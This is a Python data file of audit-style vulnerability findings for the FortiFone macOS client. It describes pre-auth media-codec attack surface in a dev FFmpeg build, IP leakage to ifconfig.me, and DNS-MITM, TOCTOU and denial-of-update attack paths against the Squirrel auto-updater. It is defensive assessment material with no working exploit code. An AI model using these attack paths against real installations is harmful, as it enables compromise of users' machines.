# FPHONE-MAC-F02: libffmpeg.dylib pre-auth VoIP codec attack surface
# ---------------------------------------------------------
FPHONE_MAC_F02_LIBFFMPEG = {
    "id":       "FPHONE-MAC-F02",
    "product":  "FortiFone v7.0.5-b141 macOS ARM64 -- libffmpeg.dylib N-115016-g631703bfb9",
    "severity": "HIGH -- pre-auth media parsing attack surface; FFmpeg dev build (not a stable release)",
    "class":    "Binary exploitation via malformed media stream (CWE-119, CWE-122)",

    "version": {
        "string": "FFmpeg version N-115016-g631703bfb9",
        "libavformat": "Lavf60.21.101 (FFmpeg 6.x era)",
        "build_type": "development build (git commit N-115016-g631703bfb9), NOT a stable release",
    },

    "codec_surface": {
        "video": ["H.264", "HEVC/H.265", "VP8", "VP9"],
        "audio_telephony": [
            "pcm_mulaw (G.711 mu-law)", "pcm_alaw (G.711 A-law)",
            "adpcm_g722 (G.722)", "adpcm_g726 (G.726)",
            "amr_nb (AMR-NB)", "amr_wb (AMR-WB)",
            "opus / libopus", "AAC / HE-AAC / HE-AACv2", "aac_latm",
        ],
        "subtitle": ["WebVTT (D_WEBVTT/CAPTIONS, D_WEBVTT/DESCRIPTIONS)"],
        "adpcm_variants": "42 ADPCM codec variants (game/media formats)",
    },

    "attack_vectors": {
        "rtp_voip": (
            "FortiFone receives SIP INVITE -> negotiates RTP payload type -> libffmpeg decodes incoming RTP stream. "
            "Malformed G.711/G.722/AMR/Opus RTP packet -> decoder bug -> heap/stack corruption. "
            "Attack is PRE-AUTH: caller sends INVITE before any authentication is complete."
        ),
        "h264_rtp": (
            "H.264 RTP payload (RFC 6184) parsed by libffmpeg H264 decoder. "
            "Known H.264 NAL unit parsing bugs (e.g., CVE-2022-3964 class) apply to this dev build. "
            "Fragmented NAL unit reassembly bugs in FU-A/STAP-A modes."
        ),
        "rtsp_stream": (
            "Electron Framework also processes RTSP (for screen share / video conference). "
            "libffmpeg RTSP session description parsing (SDP): malformed SDP in RTSP DESCRIBE response "
            "-> format string or bounds issues in sdp.c."
        ),
        "webvtt_subtitle": (
            "WebVTT subtitle injection via WebRTC data channel or RTSP: "
            "D_WEBVTT/CAPTIONS parser in libffmpeg -> buffer parsing in subtitles/webvttdec.c."
        ),
    },

    "additional_note": (
        "The libffmpeg build uses Chromium's vendored Opus (third_party/opus/src/). "
        "Assertion paths confirm source from Electron/Chromium third_party tree. "
        "Not built from a stable FFmpeg tag -- any fixes after N-115016 are absent."
    ),
}


# ---------------------------------------------------------
# FPHONE-MAC-F03: External IP disclosure via ifconfig.me
# ---------------------------------------------------------
FPHONE_MAC_F03_IFCONFIG_ME = {
    "id":       "FPHONE-MAC-F03",
    "product":  "FortiFone v7.0.5-b141 macOS ARM64 -- IP detection utility (block 38722, libcurl 8.4.0)",
    "severity": "LOW -- privacy disclosure; device presence leaked to third-party service",
    "class":    "Information exposure to third party (CWE-359)",

    "binary": {
        "phys_block": 38722,
        "size": "52992 bytes (51KB)",
        "arch": "ARM64 MH_EXECUTE",
        "imports": ["/usr/lib/libcurl.4.dylib", "/usr/lib/libSystem.B.dylib"],
        "strings": {
            "url": "https://ifconfig.me",
            "user_agent": "curl/8.4.0",
        },
    },

    "description": (
        "FortiFone bundles a standalone ARM64 binary that calls https://ifconfig.me via libcurl "
        "to determine the device's external (NAT) IP address. "
        "Purpose: NAT detection for SIP registration and ICE/STUN candidate selection. "
        "ifconfig.me is a third-party public service (not operated by Fortinet). "
        "Every FortiFone session leaks the device's external IP, timestamp, and User-Agent to "
        "ifconfig.me at startup, before any user authentication or VPN connection."
    ),

    "attack_surface": (
        "ifconfig.me response is returned as the public IP. "
        "If DNS for ifconfig.me is poisoned (MITM on corporate networks), "
        "an attacker can return a crafted IP that influences SIP/ICE behavior. "
        "Also: ifconfig.me logs all client IPs -- mass correlation attack possible."
    ),

    "remediation": "Replace ifconfig.me with a Fortinet-operated IP reflection endpoint or use STUN (RFC 5389) directly.",
}


# ---------------------------------------------------------
# FPHONE-MAC-F04: Squirrel auto-update ShipIt installer attack surface
# ---------------------------------------------------------
FPHONE_MAC_F04_SQUIRREL_SHIPIT = {
    "id":       "FPHONE-MAC-F04",
    "product":  "FortiFone v7.0.5-b141 macOS ARM64 -- Squirrel ShipIt installer (block 97276)",
    "severity": "MEDIUM -- auto-update installer; code signature check via SecCodeCheckValidity; known Squirrel attack classes",
    "class":    "Insecure auto-update mechanism (CWE-494)",

    "binary_info": {
        "phys_block": 97276,
        "arch": "ARM64 MH_EXECUTE",
        "ncmds": 24,
        "uuid": "4c4c4413-5555-3144-a191-83b5fb549a35",
        "frameworks": [
            "@rpath/Mantle.framework/Mantle",
            "@rpath/ReactiveObjC.framework/ReactiveObjC",
        ],
        "system_imports": [
            "/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit",
            "/System/Library/Frameworks/Security.framework/Versions/A/Security",
            "/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit",
        ],
    },

    "code_evidence": {
        "installer_class": "SQRLInstaller -- handles update bundle install/abort",
        "code_sig_class": "SQRLCodeSignature -- wraps SecCodeCheckValidity for update verification",
        "transaction_lock": "com.github.Squirrel.SQRLTransactionLock -- power assertion during install",
        "key_methods": [
            "verifyBundleAtURL: -- calls SecCodeCheckValidity on update bundle",
            "prepareAndValidateUpdateBundleURLForRequest: -- validates update URL + signature",
            "installItemAtURL:fromURL: -- moves bundle; uses NSFileCoordinator",
            "launchAfterInstallation -- launches app after successful install",
            "abortInstallationCommand -- rollback to previous bundle",
        ],
        "error_strings": [
            "'Code signature at URL %@ did not pass validation'",
            "'Failed to get static code for bundle %@'",
            "'Too many attempts to install, aborting update' (SQRLShipItInstallationAttempts counter)",
            "'Aborting update attempt because there are %lu running instances of the target app'",
        ],
    },

    "attack_classes": {
        "dns_mitm_update_feed": (
            "SUFeedURL in Info.plist points to update server. "
            "DNS MITM -> redirect to attacker update server -> serve malicious .zip with valid-looking bundle. "
            "SQRLCodeSignature calls SecCodeCheckValidity with a stored SecRequirement. "
            "If the requirement string is permissive (e.g. 'anchor apple generic'), "
            "an attacker-signed bundle passes validation."
        ),
        "toctou_bundle_swap": (
            "SQRLInstaller uses NSFileCoordinator for atomicity, but moves bundles via "
            "rename across filesystem boundaries (direct move or cross-volume copy). "
            "Classic TOCTOU: verify bundle at path A, then install from path A to B -- "
            "race window between verify and install allows swap to malicious bundle."
        ),
        "installation_attempt_counter": (
            "SQRLShipItInstallationAttempts is stored in app state. "
            "Exhausting the counter causes ShipIt to abort and not retry updates, "
            "creating a denial-of-update condition (prevents security patches)."
        ),
    },
}
